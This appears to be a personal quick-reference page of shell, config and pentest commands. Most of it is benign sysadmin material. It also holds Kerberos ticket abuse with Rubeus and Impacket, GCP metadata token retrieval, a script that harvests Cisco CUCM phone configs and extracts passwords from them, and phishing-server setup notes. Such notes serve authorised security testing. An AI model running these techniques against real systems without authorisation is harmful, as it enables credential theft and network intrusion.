---
atitle: TL;DR Tooling
description: Quick reference for tools
date: 2023-08-07
---

# TL;DR Tooling

## Objective

Provide a quick reference for running dayly and not-so-common tools.

## ~/.bashrc

**Check if a string is in PATH if not, add it**
```bash
HOME_BIN="/home/luser/bin"
[[ ":$PATH:" != *":$HOME_BIN:"* ]] && export PATH="$PATH:$HOME_BIN"
```

## AWS

Session Manager CLI plugin

```bash
$ aws ssm start-session --profile $PROFILE --target $INSTANCE_ID
```

## Incus

**Quick install**

```bash
$ curl -fsSL https://pkgs.zabbly.com/get/incus-stable | sudo sh
$ apt-get --install-recommends install curl python3 xorriso spice-client-gtk
```



**Share a folder with a container**

```bash
$ incus config device add <instance_name> <device_name> disk source=<path_on_host> path=<path_in_instance>
```

**Blog init**

```bash
$ incus profile show blog
config:
  raw.idmap: both 1000 0
  user.user-data: |
    #cloud-config
    package_update: true
    packages:
      - vim
      - curl
      - git
      - screen
    runcmd:
      - mkdir -pv /etc/vim
      - curl -o /etc/vim/vimrc.local https://raw.githubusercontent.com/amix/vimrc/master/vimrcs/basic.vim
      - echo 'alias ll="ls -l"' >> /root/.bashrc
      - curl -Lo /root/nvm_install.sh https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh
      - bash /root/nvm_install.sh
      - nvm install node --lts
description: blog profile
devices:
  eth0:
    network: incusbr0
    type: nic
  gosecure:
    path: /blog
    source: /home/luser/personnal/novakele.github.io
    type: disk
  root:
    path: /
    pool: default
    type: disk
name: blog
used_by:
- /1.0/instances/blog
project: default
```

```bash
$ cd /blog
$ npm run docs:build
```

**Windows VM with TPM**

```bash
$ incus profile show windows
config:
  limits.cpu: "4"
  limits.memory: 4GiB
  security.secureboot: "false"
description: Windows profile (4 vcpu, 4G RAM, no secureboot, tpm)
devices:
  eth0:
    name: eth0
    network: incusbr0
    type: nic
  root:
    path: /
    pool: default
    type: disk
  vtpm:
    path: /dev/tpm0
    type: tpm
name: windows
project: default

```

**Pentest profile**

```bash
config:
  raw.idmap: |-
    uid 1000 0
    gid 1000 0
  user.user-data: |
    #cloud-config
    package_update: true
    packages:
      - vim
      - curl
      - git
      - screen
    runcmd:
      - mkdir -pv /etc/vim
      - curl -o /etc/vim/vimrc.local https://raw.githubusercontent.com/amix/vimrc/master/vimrcs/basic.vim
      - echo 'alias ll="ls -l"' >> /root/.bashrc
      - mkdir -pv /root/.nxc
      - echo 'W254Y10Kd29ya3NwYWNlID0gZGVmYXVsdApsYXN0X3VzZWRfZGIgPSBzbWIKcHduM2RfbGFiZWwgPSBhZG1pbmlzdHJhdG9yX3ByaXZpbGVnZXMKYXVkaXRfbW9kZSA9ICoKcmV2ZWFsX2NoYXJzX29mX3B3ZCA9IDAKbG9nX21vZGUgPSBUcnVlCmlnbm9yZV9vcHNlYyA9IFRydWUKaG9zdF9pbmZvX2NvbG9ycyA9IFsiZ3JlZW4iLCAicmVkIiwgInllbGxvdyIsICJjeWFuIl0KCltCbG9vZEhvdW5kXQpiaF9lbmFibGVkID0gRmFsc2UKYmhfdXJpID0gMTI3LjAuMC4xCmJoX3BvcnQgPSA3Njg3CmJoX3VzZXIgPSBuZW80agpiaF9wYXNzID0gbmVvNGoKCltFbXBpcmVdCmFwaV9ob3N0ID0gMTI3LjAuMC4xCmFwaV9wb3J0ID0gMTMzNwp1c2VybmFtZSA9IGVtcGlyZWFkbWluCnBhc3N3b3JkID0gcGFzc3dvcmQxMjMKCltNZXRhc3Bsb2l0XQpycGNfaG9zdCA9IDEyNy4wLjAuMQpycGNfcG9ydCA9IDU1NTUyCnBhc3N3b3JkID0gYWJjMTIzCgo=' | base64 -d > /root/.nxc/nxc.conf
description: pentest
devices:
  eth0:
    network: incusbr0
    type: nic
  gosecure:
    path: /work
    source: /home/luser/work
    type: disk
  root:
    path: /
    pool: default
    type: disk
name: gosecure
project: default

```

**Adding DNS records to a network**

```bash
$ incus network edit incusbr0
config:
  raw.dnsmasq: |
    srv-host=_VLMCS._tcp.incus,kms.incus,1688,0,5

```

**Create L2 profile for Responder**

```bash
# incus profile device add ${profile_name} ${name_of_the_nic_inside_container} nic nictype=macvlan parent=${physical_lan_nic}
$ incus profile device add l2 eth0 nic nictype=macvlan parent=eno1
```

**Pass USB device to VM or Container**

```bash
incus config device add <VM/Container name> <arbitrary name> usb vendorid=05ac productid=1209
```





## Git

Clone a repo with a specific SSH key

```bash
$ git clone --config core.sshCommand='ssh -i ~/.ssh/<ssh_private_key>' git@<git_server>:<git repo>
```

## Manual Windows Reconnaissance

> Most of these are really bad OPSEC

List remote shares

```cmd
net view \\<FQDN || IP>
```

Spawn process as domain user on non domain computer

```cmd
runas /user:<user>@<domain> /netonly <process>
```

## Rubeus

Load TGT from NT || AES256 hash

> Useful when trying to use built-in Windows tools

```cmd
Rubeus.exe asktgt /rc4:<NT hash> /user:<user> /domain:<domain> /ptt
Rubeus.exe asktgt /aes256:<aes256-cts-hmac-sha1-96> /user:<user> /domain:<domain> /ptt
```

Load ticket from Kirbi file (ccache converted to kirbi)

```cmd
.\Rubeus.exe ptt /ticket:"C:\Users\admin\Desktop\ticket.kirbi"
```

Kerberoasting # Useful when there are Kerberoast errors with impacket or Rubeus `ptt`

```
.\Rubeus.exe kerberoast /outfile:kerberoast.txt /domain:DOMAIN /creduser:'DOMAIN\USER' /credpassword:'PASSWORD'
```





**Finding Active Directory controllers**

```bash
dig _ldap._tcp.dc._msdcs.EXAMPLE.COM -t any
dig _ldap._tcp.dc._msdcs.EXAMPLE.COM -t srv
dig _kerberos._tcp.EXAMPLE.COM -t any
```





## TMUX

<= 2.0

```
setw -g mode-mouse on
set -g mouse-select-pane on
set -g mouse-resize-pane on
set -g mouse-select-window off
```

=> 2.1

```
set-option -g mouse on
```

Reload configuration file

```
CTRL-a source ~/.tmux.conf
```

## Impacket

Check the state of RDP sessions

```shell
$ getTGT.py -hashes 'NT hash' <domain>/<user>
$ KRB5CCNAME=<ccache> atexec.py -k <fqdn> qwinsta
```

Enable RestrictedAdmin for PTH RDP

```bash
$ impacket-reg -k -no-pass <domain>/<user>@<host>  add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vd 1 -vt REG_DWORD
```





## User management

Create a group
```shell
$ sudo groupadd <name>
```

Create a system user
```shell
$ sudo useradd -c "system user" --gid <name> --no-create-home --no-user-group -s /usr/sbin/nologin --system
```

## Apache

Boilerplate for reverse HTTP proxy
```apache
<virtualhost *:80>

    ServerName <SERVER NAME>

    ErrorLog ${APACHE_LOG_DIR}/${SERVER_NAME}.error.log
    CustomLog ${APACHE_LOG_DIR}/${SERVER_NAME}.access.log combined

    ProxyPass /  http://localhost:8080/ nocanon
    ProxyPassReverse /  http://localhost:8080/
    ProxyRequests Off
    AllowEncodedSlashes NoDecode
</virtualhost>
```

## xinetd

Simple TCP forward

```bash 
$ cat /etc/xinetd.d/smb 
service smdb_forward
{
    disable         = no
    type            = UNLISTED
    socket_type     = stream
    protocol        = tcp
    user            = nobody
    wait            = no
    redirect        = 10.55.141.26 445
    port            = 445
}
```

## SSH

**Common SSH block options**

```
host *
	addkeystoagent yes
	
host reverse
	forwardagent yes

host engagement
        proxyjump jump
        port 40219
        identityfile ~/.ssh/main
        userknownhostsfile /dev/null
        user user@domain.tld
        hostname localhost
        ServerAliveCountMax 99
        ServerAliveInterval 0
        TCPKeepAlive no
        RemoteForward 9000
        dynamicforward 1338
        # bad idea
        StrictHostKeyChecking no
        TunnelDevice 1337:1337
        Tunnel point-to-point
        remoteforward localhost:2222 192.0.2.250:2222
        LocalForward 192.0.2.250:8998 127.0.0.1:8998

```

**~/.ssh/authorized_keys**

https://manpages.debian.org/unstable/openssh-server/authorized_keys.5.en.html

```bash
 ,
#expiry-time="20250822",no-pty,port-forwarding,permitlisten="localhost:3389",command="/usr/sbin/nologin" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGe0Ryfm9hgYoCb9tJxKOEuYrVlBHh8o3dYUHbMWUD6o
```

**Bad way of bulk checking callbacks**

```bash
ss -tulpn | grep 127.0.0.1 | awk '{print $5}' | cut -d ':' -f2 | sort -uV | tail -n 14 | xargs -I{} bash -c "ssh localhost -oStrictHostKeyChecking=no -ouserknownhostsfile=/dev/null -p {} 'ip -br a | grep '10.10.1' && echo {}' || echo no"
```





# WSL2

**Build a custom kernel**

Check the official instructions at https://github.com/microsoft/WSL2-Linux-Kernel.git.

Here is a TL;DR

```bash
$ sudo apt install build-essential flex bison dwarves libssl-dev libelf-dev cpio qemu-utils curl wget vim git python3 bc
$ git clone https://github.com/microsoft/WSL2-Linux-Kernel.git
$ cd WSL2-Linux-Kernel/
$ make -j $(nproc) KCONFIG_CONFIG=Microsoft/config-wsl && make INSTALL_MOD_PATH="$PWD/modules" modules_install
$ sudo bash ./Microsoft/scripts/gen_modules_vhdx.sh "$PWD/modules" $(make -s kernelrelease) modules.vhdx
$ mkdir /mnt/c/wsl
$ cp vmlinux /mnt/c/wsl/
$ sudo ./Microsoft/scripts/gen_modules_vhdx.sh "$PWD/modules" $(make -s kernelrelease) modules.vhdx
$ cp modules.vhdx /mnt/c/wsl/
$ cat << EOF | sudo tee /etc/modules-load.d/incus.conf
kvm
vhost-net
bridge
tun
tpm
EOF

```

**Global Configuration %USERPROFILE/.wslconfig%**

```ini
[wsl2]
networkingMode=mirrored
kernel=c:\\wsl\vmlinux
kernelModule=c:\\wsl\modules.vhdx # requires version 2.5+

```

# Windows
## Packet Forward

```powershell
PS> Get-NetIPInterface | select ifIndex,InterfaceAlias,AddressFamily,ConnectionState,Forwarding | Sort-Object -Property IfIndex | Format-Table
PS> Set-NetIPInterface -ifindex <required interface index from table> -Forwarding Enabled
# Set-NetIPInterface -Forwarding Enabled

PS> Set-Service RemoteAccess -StartupType Automatic; Start-Service RemoteAccess

```



### RDP

Connect to a AAD joined PC with a AAD account:

`AzureAD\username@domain.tld`

# Database

## Postgresql

**create admin user**

```postgresql
CREATE USER ladmin WITH ENCRYPTED PASSWORD '1318f5f7b9f0bb3375de191e4457fbb237028fca9a9c47ab0fd841dd681012da';
ALTER USER ladmin WITH SUPERUSER;
```

**Create new DB and provide all privileges to a user**

```postgresql
CREATE DATABASE zitadel;
CREATE USER zitadel WITH ENCRYPTED PASSWORD '1895b32fa94cedbbd1414bc40f35addae9aa9fe8f5fa2cdd0db668a7ec264eb9';
GRANT ALL PRIVILEGES on DATABASE zitadel to zitadel;
```

**Show all DBs**

```postgresql
\l
```

**Show all users and their privileges**

```postgresql
\du
```

**Allow network connection**

```bash
# /etc/postgresql/17/main/pg_hba.conf
host    zitadel zitadel 10.1.194.0/24   scram-sha-256
host    all     ladmin  0.0.0.0/0       scram-sha-256
```

# OpenSSL

**Generate secure strings for passwords**

```bash
openssl rand -hex 32
```

**Generate self-signed certificates for local services**

```bash
openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-521 -out ./tls.key
openssl req -new -key tls.key -out tls.csr
openssl x509 -req -days 3650 -in tls.csr -signkey tls.key -out tls.crt

```

## Markdown

https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax#alerts

> [!NOTE]
> Useful information that users should know, even when skimming content.

> [!TIP]
> Helpful advice for doing things better or more easily.

> [!IMPORTANT]
> Key information users need to know to achieve their goal.

> [!WARNING]
> Urgent info that needs immediate user attention to avoid problems.

> [!CAUTION]
> Advises about risks or negative outcomes of certain actions.



## O365

- Download the fat clients @ [My account](https://portal.office.com/account/?ref=Harmony)

- Admin Panel https://admin.microsoft.com/

**Find all Sharepoint Sites with dork**

```
contentclass:STS_Site
```



## Google Cloup Platform (GCP)

**Query the metadata endpoint**

```bash
curl -s http://metadata.google.internal/computeMetadata/v1/?recursive=true

curl "http://metadata.google.internal/computeMetadata/v1/instance/image" -H "Metadata-Flavor: Google"
```



**Get the credentials for the account running the compute instance**

```bash
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```



## Nmap

**Private IP ranges gateway scan**

```
# ./possible /24 gateways
10.0-255.0-255.1
172.16-31.0-255.1
192.168.0-255.1
```

```bash
nmap -iL ./gateways.list -sn -oA ./nmap/possible_gateways --min-rate 10000
```

**Best ports to find Windows hosts**



## Systemd-networkd

Adding route blocks based off a list of networks

```bash
xargs -a networks/possible_gateways.list -I{} echo -e "[Route]\nGateway=192.0.2.254\nDestination={}\n" | tee -a /etc/systemd/network/ssh_ptp.network
```



## Dig

**Finding Domain Controllers**

```bash
# LDAP
dig any _ldap._tcp.dc._msdcs.example.com

# Kerberos
dig any _kerberos._tcp.example.com
```



## Active Directory Certificate Authority (ADCS)

**ESC8 fuzzer**

https://gist.githubusercontent.com/zblurx/99fe1971562593fd1211931bdc979fbb/raw/6e18ba3b0694303d6eca3fda8505cf800ef83540/esc8fuzzer.py



## Cisco VoIP (Should write this as an article)



Get the CUCM info -> https://github.com/trustedsec/SeeYouCM-Thief -> unauth userenum -> password spray

Get the TFTP Server info -> download the config file -> could be free creds

```bash
# tftp IP
tftp> get SPDefault.cnf.xml
tftp> get SEP<MAC>.cnf.xml
```



- http://CUCM_IP:6970/ConfigFileCacheList.txt
- http://CUCM_IP:6970/SEP[MAC].cnf.xml.sgn
- ciscophones.tgz

Check for the following keywords:

- user
- pass
- profile
- cred



**Nested `xargs` to fetch configuration files on multiple CUCM**

```bash
xargs -a hosts/cucm.list -I{} bash -c "xargs -a hosts/phones.list -I [] curl --connect-timeout 0.5 http://{}:6970/[].cnf.xml.sgn -o []_{}.cnf.xml.sgn
```



**Quick script to pull configuration files from multiple CUCM**

Try each CUCM as they might not all be reachable.

```bash
#!/usr/bin/env bash

#set -ex

phone="${1}"

if [[ -z "${phone}" ]]
then
    echo "missing phone http[s]://IP as first argument"
fi


config_page="/CGI/Java/Serviceability?adapter=device.statistics.configuration"




content=$(curl --connect-timeout 10 -k "${phone}/CGI/Java/Serviceability?adapter=device.statistics.configuration" 2>/dev/null)

if [[ -z "${content}" ]]
then
    echo -e "[!] Failed to pull configuration page content\n Try increasing the timeout"
    exit 1
fi

echo "[+] Got device configuration page"

device=$(grep -Eo -m1 'SEP[0-9A-Fa-f]{1,20}' <<< ${content})

if [[ -z "${device}" ]]
then
    echo "[!] Failed to extract device name from configuration page"
    exit 1
fi

echo "[+] Got device name from configuration page"


mapfile -t cucm_ips < <(grep -oE 'Unified CM.*Information' <<< ${content} | grep -oE '([0-9]{1,3}.){3}[0-9]{1,3}')

if [[ ${#cucm_ips[@]} -eq 0 ]]
then
    echo "[!] Failed to obtain at least 1 CUCM IP address"
    exit 1
fi

echo "[+] Got ${#cucm_ips[@]} CUCM IP(s)"


ext1=".cnf.xml"
ext2=".cnf.xml.sgn"
default1="SPDefault"
default2="ConfigFileCacheList.txt"


mkdir -pv ./tmp

for cucm in "${cucm_ips[@]}"; do
    filename1="${cucm}_${device}${ext1}" # SEPDEADBEEF.cnf.xml
    filename2="${cucm}_${device}${ext2}" # SEPDEADBEEF.cnf.xml.sgn

    defaultfile1="${cucm}_${default1}${ext1}" # SEPDefault.cnf.xml
    defaultfile2="${cucm}_${default1}${ext2}" # SEPDefault.cnf.xml.sgn

    defaultfile3="${cucm}_${default2}" # ConfigFileCacheList.txt
    defaultfile4="${cucm}_${default2}.sgn" # ConfigFileCacheList.txt.sgn


    curl -k --connect-timeout 10 "http://${cucm}:6970/${device}${ext1}" -o "./tmp/${filename1}" 2>/dev/null
    if [[ -f "./tmp/${filename1}" && ! -s "./tmp/${filename1}" ]]
    then
        rm "./tmp/${filename1}"
    else
        echo "[+] Pulled ./tmp/${filename1}"
    fi

    curl -k --connect-timeout 10 "http://${cucm}:6970/${device}${ext2}" -o "./tmp/${filename2}" 2>/dev/null
    if [[ -f "./tmp/${filename2}" && ! -s "./tmp/${filename2}" ]]
    then
        rm "./tmp/${filename2}"
    else
        echo "[+] Pulled "./tmp/${filename2}""
    fi


    curl -k --connect-timeout 10 "http://${cucm}:6970/${default1}${ext1}" -o "./tmp/${defaultfile1}" 2>/dev/null
    if [[ -f "./tmp/${defaultfile1}" && ! -s "./tmp/${defaultfile1}" ]]
    then
        rm "./tmp/${defaultfile1}"
    else
        echo "[+] Pulled "./tmp/${defaultfile1}""
    fi

    curl -k --connect-timeout 10 "http://${cucm}:6970/${default1}${ext2}" -o "./tmp/${defaultfile2}" 2>/dev/null
    if [[ -f "./tmp/${defaultfile2}" && ! -s "./tmp/${defaultfile2}" ]]
    then
        rm "./tmp/${defaultfile2}"
    else
        echo "[+] Pulled "./tmp/${defaultfile2}""
    fi

    curl -k --connect-timeout 10 "http://${cucm}:6970/$default2" -o "./tmp/${defaultfile3}" 2>/dev/null
    if [[ -f "./tmp/${defaultfile3}" && ! -s "./tmp/${defaultfile3}" ]]
    then
        rm "./tmp/${defaultfile3}" 
    else
        echo "[+] Pulled "./tmp/${defaultfile3}" "
    fi
    curl -k --connect-timeout 10 "http://${cucm}:6970/$default2.sgn" -o "./tmp/${defaultfile4}" 2>/dev/null
    if [[ -f "./tmp/${defaultfile4}" && ! -s "./tmp/${defaultfile4}" ]]
    then
        rm "./tmp/${defaultfile4}"
    else
        echo "[+] Pulled "./tmp/${defaultfile4}""
    fi

done

```

**Parsing Configuration files**

```bash
find . -type f -name 'SP*.cnf.xml' -exec xq --raw-output '.serviceProfile.Directory | .DN + ":" + .Password' "{}" \;
```





**References:**

- https://www.cisco.com/c/en/us/support/docs/unified-communications/unified-communications-manager-callmanager/200408-Retrieve-Phone-Configuration-File-from-T.html
- https://trustedsec.com/blog/seeyoucm-thief-exploiting-common-misconfigurations-in-cisco-phone-systems
- https://github.com/trustedsec/SeeYouCM-Thief/
- https://www.uccollabing.com/how-to-download-list-of-sep-cnf-xml-files-in-cucm/



## Impacket

**getTGT**

```bash
impacket-getTGT domain.tld/username:'password'
# make sure that DNS is working
```





## Certipy

```bash
export KRB5CCNAME=/root/username.ccache
certipy-ad find -u username@domain.tld -p 'password' -k
```





## NGINX

**Get snakeoil certificates**

```
apt install ssl-cert

# /etc/ssl/certs/ssl-cert-snakeoil.pem
# /etc/ssl/private/ssl-cert-snakeoil.key
```



**Packages to install for phishing campaign**

- libnginx-mod-http-js
- nginx-full
- certbot
- apache2-utils
- ssl-cert # for snakepol



**Default nginx.conf**

Sane defaults provided by Mozilla TLS generator.

I added the default behavior to return HTTP 418 if there is no matching `server_name`.

Additional `server` block should be added in `/etc/nginx/conf.d/`

```bash
sudo openssl dhparam -out /etc/nginx/dhparam 4096
```





```
user www-data;
worker_processes auto;
worker_cpu_affinity auto;
pid /run/nginx.pid;
error_log /var/log/nginx/error.log;
include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 768;
    # multi_accept on;
}



http {

	log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    sendfile on;
    tcp_nopush on;
    types_hash_max_size 2048;
    server_tokens off; # Recommended practice is to turn this off
    
    client_max_body_size 1024M;

    server_names_hash_bucket_size 64;
    server_name_in_redirect off;

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    access_log /var/log/nginx/access.log main;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ecdh_curve X25519:prime256v1:secp384r1;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-CHACHA20-POLY1305;
    ssl_prefer_server_ciphers off;

    ssl_session_timeout 1d;
    ssl_session_cache shared:MozSSL:10m;  # about 40000 sessions

    # curl https://ssl-config.mozilla.org/ffdhe2048.txt -o /etc/nginx/dhparam
    ssl_dhparam "/etc/nginx/dhparam";


    resolver 127.0.0.1;

    gzip on;

    include /etc/nginx/conf.d/*.conf;


    # default matching HTTP
    server {
        listen 80 default_server;
        listen [::]:80 default_server;
        server_name _;

        return 418;

    }
    
    
    # default matching HTTPS
    server {
        listen 443 ssl default_server;
        listen [::]:443 ssl default_server;
        ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
        ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;

        # HSTS (ngx_http_headers_module is required) (63072000 seconds)
        add_header Strict-Transport-Security "max-age=63072000" always;

        return 418;
    }

}

```



**Boilerplate for vhost**



```
#/etc/nginx/conf.d/vhost.conf
server {

    listen 80;
    listen [::]:80;
    server_name VHOST;

    location / {
        return 301 https://$host$request_uri;
    }

}

server {

    listen 443 ssl;
    listen [::]:443 ssl;

    server_name VHOST;
    ssl_certificate /etc/letsencrypt/live/VHOST/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/VHOST/privkey.pem;

    access_log /var/log/nginx/VHOST_access.log;
    error_log /var/log/nginx/VHOST_error.log;

    #auth_basic "Login";
    #auth_basic_user_file /etc/nginx/.htpasswd;

    add_header Strict-Transport-Security "max-age=63072000" always;
    
    root /var/www/html;
    
    location ~ /.* {
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_ssl_name $host;
        proxy_ssl_server_name on;
        proxy_ssl_verify off;
        proxy_read_timeout 90;

        proxy_pass http://localhost$request_uri;
    }
 }
```

